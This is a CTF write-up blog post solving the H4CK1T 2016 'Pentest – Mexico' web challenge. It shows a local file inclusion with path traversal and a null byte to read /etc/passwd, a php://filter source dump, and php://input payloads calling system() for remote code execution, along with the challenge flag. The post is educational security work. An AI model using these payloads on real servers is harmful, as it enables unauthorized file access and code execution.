---
title: '[H4CK1T 2016] Pentest â€“ Mexico Writeup'
author: Megabeets
type: post
date: 2016-10-02T20:54:26+00:00
url: /h4ck1t-2016-pentest-mexico/
categories:
  - H4CK1T CTF 2016
  - Writeups
tags:
  - CTF
  - H4CK1T
  - Web
  - Writeups

---
### **Description:**

> **Task: Remote pentest &#8211; Mexico &#8211; 150 &#8211; Web**
> 
> <span style="font-weight: 400;">Our foreign partners have some problems with qualified staff in the field of information technology, we decided to help them and to conduct remote testing of their new website. Your task is to find a hole in the system and grab some information to confirm the hack .Good luck !</span>  
> [<span style="font-weight: 400;">http://91.231.84.36:9150/</span>][1]

YAY! Web challenge! If you are following my blog <span style="font-size: 10pt;"><em>(If not, the subscribe form is on left)</em></span> you already know how much I love web challenges, It&#8217;s either easy points or great puzzle.

Let&#8217;s open the website and see what we have:

<img src="../uploads/h4ck1t_mexico1.png" /> 

WOW! JUSTICE LEAGUE! Did I mentioned that I love comic books and especially Batman? Oh, Not yet?

Well, this challenge is going to be awesome. No. It&#8217;s already awesome!

OK,Â deep breath. Let&#8217;s start. See that menu on the bottom? Let&#8217;s click on some link to see what will happen.

<img src="../uploads/h4ck1t_mexico2.png" /> 

Look at the URL, the &#8220;about&#8221; page is included by the &#8220;index.php&#8221; using php commands &#8216;require&#8217; or &#8216;include&#8217;. When we see something like that in a challenge we can check if the site is vulnerable to LFI attack. In Local File Inclusion attack we can include pages from the local server. Let&#8217;s try to include /etc/passwd to check for the existence of the vulnerability

http://91.231.84.36:9150/index.php?page=../../../../etc/passwd

Didn&#8217;t work. Let&#8217;s try to add null byte at the end

http://91.231.84.36:9150/index.php?page=../../../../etc/passwd%00

<img src="../uploads/h4ck1t_mexico3.png" /> 

It worked! We successfully got the /etc/passwd file. So what now? Let&#8217;s try to read the pure php file to see if the flag is in the php pages.

We can use php://filter to print the content of index.php in base64 format. We need to encode the content because we don&#8217;t want the php engine to compile the php parts of the code.

http://91.231.84.36:9150/index.php?page=php://filter/convert.base64-encode/resource=index

We got encoding page, now let&#8217;s decode it and see if we find a flag . I deleted some content to decrease the size of the code in the post.

```php
&lt;?php
    if ($_GET["page"]) {
    $file = $_GET["page"].".php";
    // simulate null byte issue
    $file = preg_replace('/\x00.*/',"",$file);
        include($file);
    } 
    else
    {
        echo '    &lt;div class="container"&gt;
        &lt;div class="row"&gt;
            &lt;div class="col-md-6 col-sm-12"&gt;
                &lt;h1&gt;The Big Picture&lt;/h1&gt;
                &lt;p&gt;Welcome to the Big Picture. This fantastic digital resource combines the best of formal and informal learning. 
If you are already using The Big Picture, you can register for and access exclusive extra material from this platform. 
This is The Big Picture: have you experienced it yet?  &lt;/p&gt; 
            &lt;/div&gt;
        &lt;/div&gt;';
    }
    //flag{h@h@h@_man_n1ce_try} 

?&gt;
&lt;!DOCTYPE html&gt;
&lt;html class="full" lang="en"&gt;
&lt;head&gt;

...
...
...

    &lt;/div&gt;
    &lt;script src="js/jquery.js"&gt;&lt;/script&gt;
    &lt;script src="js/bootstrap.min.js"&gt;&lt;/script&gt;

&lt;/body&gt;

&lt;/html&gt;

```


&nbsp;

Nope. No flag. The &#8220;flag{&#8230;}&#8221; thing isn&#8217;t really the flag because the flag in this CTF should be in h4ck1t{&#8230;} format.  
Also the other pages like &#8216;about&#8217; and &#8216;contact&#8217; is not contain any flag. So we probably need to perform LFI to RCE (Remote Code Execution) attack. We can use theÂ php://input method to send php commands through Post requests. Using Firefox Hackbar plugin we can do it easily.  
Put the URL to be http://91.231.84.36:9150/index.php?page=php://input Â And the POST data to be

```default
&lt;?  system('ls') ;?&gt;
```


<img src="../uploads/h4ck1t_mexico4.png" /> 

Success. We got the RCE and we now know about a new secret file. Let&#8217;s read it using the same way but this time with

```php
Â &lt;? Â system('cat file') ;?&gt;
```


And we got the flag ðŸ™‚

`<strong>Flag:Â </strong><em>h4ck1t{g00d_rfi_its_y0ur_fl@g}</em>`

<div class="nf-post-footer">
  <p style="text-align: right">
    <a href="https://www.megabeets.net/about.html#vegan"><img src="../uploads/megabeets_inline_logo.png" />Eat Veggies</a>
  </p>
</div>

 [1]: http://91.231.84.36:9150/